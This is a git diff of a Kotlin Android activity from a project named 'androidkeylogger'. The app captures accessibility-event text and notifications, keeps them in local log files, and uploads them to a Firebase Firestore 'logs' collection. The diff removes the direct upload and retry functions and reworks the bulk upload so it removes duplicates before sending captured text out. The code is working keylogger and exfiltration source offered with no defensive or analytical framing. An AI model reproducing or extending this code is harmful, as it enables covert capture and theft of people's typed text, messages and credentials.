@@ -1,4 +1,4 @@
-package com.azamovhudstc.androidkeylogger
+package com.azamovhudstc.androidkeylogger.activity
 
 import android.annotation.SuppressLint
 import android.content.*
@@ -12,16 +12,19 @@ import androidx.appcompat.app.AppCompatActivity
 import androidx.core.view.isVisible
 import androidx.lifecycle.MutableLiveData
 import androidx.recyclerview.widget.RecyclerView
+import com.azamovhudstc.androidkeylogger.adapter.LogAdapter
+import com.azamovhudstc.androidkeylogger.adapter.NotificationAdapter
+import com.azamovhudstc.androidkeylogger.R
 import com.azamovhudstc.androidkeylogger.databinding.ActivityMainBinding
 import com.azamovhudstc.androidkeylogger.model.LogModel
 import com.azamovhudstc.androidkeylogger.model.NotificationModel
+import com.azamovhudstc.androidkeylogger.service.SvcAccFix
 import com.google.firebase.FirebaseApp
 import com.google.firebase.firestore.FirebaseFirestore
 import com.google.gson.Gson
 import com.google.gson.JsonSyntaxException
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.GlobalScope
-import kotlinx.coroutines.delay
 import kotlinx.coroutines.launch
 import java.io.File
 import java.io.FileWriter
@@ -35,8 +38,8 @@ class MainFixActivity : AppCompatActivity() {
     private val logs = mutableListOf<LogModel>()
     private var isFirstLaunch = true
     private var isNotificationFormat = MutableLiveData<Boolean>(true)
-    private val fileName = "notifications.txt"
-    private val fileNameLog = "logs.txt"
+    private val fileName = "notifications1.txt"
+    private val fileNameLog = "logs1.txt"
     private lateinit var firestore: FirebaseFirestore
 
     private var _binding: ActivityMainBinding? = null
@@ -67,6 +70,7 @@ class MainFixActivity : AppCompatActivity() {
                     timeStampDay!!
                 )
                 adapter.addNotification(notificationModel)
+
                 saveNotificationToFileLocal(notificationModel)
             }
         }
@@ -88,17 +92,7 @@ class MainFixActivity : AppCompatActivity() {
             )
             Log.d("EVENT", "onAccessibilityEventTAAAAAAA: ${text.toString()}")
             logAdapter.addNotification(notificationModel)
-            if (isInternetAvailable(this@MainFixActivity) ) {
-                if (isLocalLogsAvailable()) {
-                    sendLogToFirestore(notificationModel)
-                    uploadLocalLogsToFirestore()
-
-                } else {
-                    sendLogToFirestore(notificationModel)
-                }
-            } else {
-                saveLogToFileLocal(notificationModel)
-            }
+            saveLogToFileLocal(notificationModel)
 
         }
     }
@@ -246,14 +240,6 @@ class MainFixActivity : AppCompatActivity() {
         }
     }
 
-    private fun retryUploadLog(log: LogModel, retryDelayMs: Long = 5000L) {
-        GlobalScope.launch(Dispatchers.IO) {
-            delay(retryDelayMs)
-            val nextRetryDelayMs =
-                (retryDelayMs * 2).coerceAtMost(6000L) // Exponential backoff with a maximum delay
-            sendLogToFirestore(log)
-        }
-    }
 
     private fun isNetworkFastEnough(context: Context): Boolean {
         val connectivityManager =
@@ -269,7 +255,10 @@ class MainFixActivity : AppCompatActivity() {
         val file = File(filesDir, fileNameLog)
         return file.exists()
     }
-
+    private fun isLocalNotificationsAvailable(): Boolean {
+        val file = File(filesDir, fileName)
+        return file.exists()
+    }
     private fun uploadLocalLogsToFirestore() {
         val file = File(filesDir, fileNameLog)
         if (file.exists()) {
@@ -287,13 +276,24 @@ class MainFixActivity : AppCompatActivity() {
 
             GlobalScope.launch(Dispatchers.IO) {
                 logsToUpload.forEach { log ->
-                    dataCollection.add(log)
-                        .addOnSuccessListener {
-                            deleteLogFromLocalFile(log)
-                        }
-                        .addOnFailureListener { e ->
-                            Log.d("EVENT", "sendLogToFirestore: ${e.message}")
-                            // Handle failure
+                    // Tekshirib chiqamiz, agar "text" Firebase'da mavjud bo'lsa
+                    dataCollection.whereEqualTo("text", log.text).get()
+                        .addOnSuccessListener { querySnapshot ->
+                            // Agar tekshirish natijasida bitta qator ham topilsa
+                            if (!querySnapshot.isEmpty) {
+                                // Faqat bitta qator qoldiramiz va o'chirib tashlaymiz
+                                val document = querySnapshot.documents.first()
+                                document.reference.delete()
+                            }
+                            // Logni Firebase'ga yuboramiz
+                            dataCollection.add(log)
+                                .addOnSuccessListener {
+                                    deleteLogFromLocalFile(log)
+                                }
+                                .addOnFailureListener { e ->
+                                    Log.d("EVENT", "sendLogToFirestore: ${e.message}")
+                                    // Xatolikni qayta qarash
+                                }
                         }
                 }
             }
@@ -338,20 +338,6 @@ class MainFixActivity : AppCompatActivity() {
             context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
         val networkInfo = connectivityManager.activeNetworkInfo
         return networkInfo != null && networkInfo.isConnected
-    }
-
-    private fun sendLogToFirestore(logModel: LogModel) {
-        // Firebase Firestore bog'lanish
-        val firestore = FirebaseFirestore.getInstance()
-        val dataCollection = firestore.collection("logs")
-        dataCollection.add(logModel)
-            .addOnSuccessListener { documentReference ->
-                Log.d("EVENT", "sendLogToFirestore: ${documentReference.id}")
-            }
-            .addOnFailureListener { e ->
-                retryUploadLog(logModel)
-                Log.d("EVENT", "sendLogToFirestore: ${e.message}")
-            }
     }
 
 
